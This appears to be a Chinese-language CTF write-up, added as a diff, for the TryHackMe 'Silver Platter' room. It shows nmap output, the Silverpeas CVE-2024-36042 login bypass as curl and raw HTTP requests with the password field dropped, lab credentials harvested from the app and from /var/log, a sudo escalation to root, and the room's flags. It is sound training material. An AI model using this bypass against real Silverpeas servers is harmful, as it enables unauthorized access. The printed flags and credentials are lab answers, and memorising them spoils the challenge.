@@ -1,0 +1,194 @@
+---
+title: 1. Silver Platter
+sidebar_position: 2
+---
+
+攻击链：端口扫描 → 隐藏目录 → CVE-2024-36042 → SSH 登录 → 提权
+
+```text
+user.txt：THM{c4ca4238a0b923820dcc509a6f75849b}
+root.txt：THM{098f6bcd4621d373cade4e832627b4f6}
+```
+
+IP：10.48.132.120
+
+## 一、信息收集
+
+```bash
+nmap -sV -sC -p- 10.48.132.120
+
+Nmap scan report for 10.48.132.120 (10.48.132.120)
+Host is up (0.13s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 6f:99:28:2a:80:dc:67:26:64:ef:75:7d:02:04:38:fe (ECDSA)
+|_  256 d7:c1:07:1f:9a:40:b6:e9:e8:ee:45:ea:79:e3:f4:9a (ED25519)
+80/tcp   open  http       nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Fri, 13 Nov 2026 01:44:48 GMT
+|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Fri, 13 Nov 2026 01:44:47 GMT
+|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|_http-title: Error
+```
+
+> Contact
+> If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
+>
+> 联系我们
+> 如果您想与我们取得联系，请在Silverpeas上联系我们的项目经理。他的用户名是"scr1ptkiddy"。
+
+根据提示，在 8080 端口页面拼接 silverpeas 后跳转到新的目录：
+
+```text
+http://10.48.132.120:8080/silverpeas/defaultLogin.jsp
+```
+
+## 二、漏洞验证
+
+CVE-2024-36042：向登录接口发送一个故意省略密码字段的 POST 请求，然后观察服务器是否仍为你建立了已认证的会话。
+
+```bash
+curl -i -s -X POST "http://ip:8080/silverpeas/AuthenticationServlet" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "Login=scr1ptkiddy&DomainId=0"
+```
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ curl -i -s -X POST "http://10.48.132.120:8080/silverpeas/AuthenticationServlet" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "Login=scr1ptkiddy&DomainId=0"
+HTTP/1.1 302 Found
+Set-Cookie: JSESSIONID=V7yBFsfCsJvI7Ht5NcFWkMAjQcBRhO1eEhYCkEc3.ebabc79c6d2a; path=/silverpeas; HttpOnly
+Set-Cookie: defaultDomain=0; path=/; Max-Age=31536000; Expires=Sat, 13-Nov-2027 01:47:43 GMT
+Set-Cookie: svpLogin=scr1ptkiddy; path=/; Max-Age=31536000; Expires=Sat, 13-Nov-2027 01:47:43 GMT
+X-XSS-Protection: 1
+x-ua-compatible: ie=edge
+X-Frame-Options: SAMEORIGIN
+Location: http://10.48.132.120:8080/silverpeas/Main//look/jsp/MainFrame.jsp
+Content-Security-Policy: default-src 'self' blob: mailto:  https: spwebdav:  ws://10.48.132.120:8080 ; script-src 'self' blob: 'unsafe-inline' 'unsafe-eval'  https: spwebdav: https://apis.google.com; style-src 'self' 'unsafe-inline'  https: spwebdav: https://fonts.googleapis.com; style-src-elem 'self' blob: 'unsafe-inline' https://fonts.googleapis.com
+Date: Fri, 13 Nov 2026 01:47:43 GMT
+Connection: keep-alive
+Access-Control-Allow-Origin: http://10.48.132.120:8080
+X-Content-Type-Options: nosniff
+Content-Length: 0
+```
+
+使用 Burp Suite 进行复现，使用的用户名为 scr1ptkiddy。
+
+**原本的包**
+
+```http
+POST /silverpeas/AuthenticationServlet HTTP/1.1
+Host: 10.48.132.120:8080
+Content-Length: 38
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.48.132.120:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.48.132.120:8080/silverpeas/defaultLogin.jsp
+Accept-Encoding: gzip, deflate, br
+Cookie: JSESSIONID=OFJg_FOX1MTGQqDiUT6D-kW1TwJ3Tpsccy553TwD.ebabc79c6d2a
+Connection: keep-alive
+
+Login=scr1ptkiddy&Password=&DomainId=0
+```
+
+**修改后的包**，将 Password 去掉，并且将 Content-Length: 38 改成 28：
+
+```http
+POST /silverpeas/AuthenticationServlet HTTP/1.1
+Host: 10.48.132.120:8080
+Content-Length: 28
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.48.132.120:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.48.132.120:8080/silverpeas/defaultLogin.jsp
+Accept-Encoding: gzip, deflate, br
+Cookie: JSESSIONID=OFJg_FOX1MTGQqDiUT6D-kW1TwJ3Tpsccy553TwD.ebabc79c6d2a
+Connection: keep-alive
+
+Login=scr1ptkiddy&DomainId=0
+```
+
+进入后台后发现 Manager 和 Administrateur，用相同的手法登录到 Manager 获取 SSH 登录凭据。
+
+```text
+Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.
+Username: tim
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+```
+
+## 三、提权
+
+```bash
+tim@ip-10-48-132-120:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+tim@ip-10-48-132-120:~$ ls -al
+total 12
+dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
+drwxr-xr-x 6 root root 4096 Jul 21  2025 ..
+-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
+tim@ip-10-48-132-120:~$ cat user.txt 
+THM{c4ca4238a0b923820dcc509a6f75849b}
+tim@ip-10-48-132-120:~$ ls -al /home
+total 24
+drwxr-xr-x  6 root     root     4096 Jul 21  2025 .
+drwxr-xr-x 19 root     root     4096 Nov 13 01:37 ..
+drwxr-x---  2 ssm-user ssm-user 4096 Jul 20  2025 ssm-user
+dr-xr-xr-x  2 root     root     4096 Dec 13  2023 tim
+drwxr-x---  5 tyler    tyler    4096 Dec 13  2023 tyler
+drwxr-x---  4 ubuntu   ubuntu   4096 Jul 21  2025 ubuntu
+```
+
+adm 组的核心权限：读取日志
+
+根据 Debian 的官方定义，`adm` 组用于“系统监控任务”，其成员可以读取 `/var/log` 下的许多日志文件。简单来说，它的作用就是绕过权限限制，直接查看系统运行记录。
+
+```bash
+grep -iR "tyler" /var/log/ 2>/dev/null
+
+/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
+```
+
+登录到 tyler 用户 `_Zd_zx7N823/`
+
+```bash
+tyler@ip-10-48-132-120:/home/tim$ sudo -l
+[sudo] password for tyler: 
+Matching Defaults entries for tyler on ip-10-48-132-120:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on ip-10-48-132-120:
+    (ALL : ALL) ALL
+tyler@ip-10-48-132-120:/home/tim$ sudo su root
+root@ip-10-48-132-120:/home/tim# cat /root/root.txt
+THM{098f6bcd4621d373cade4e832627b4f6}
+```
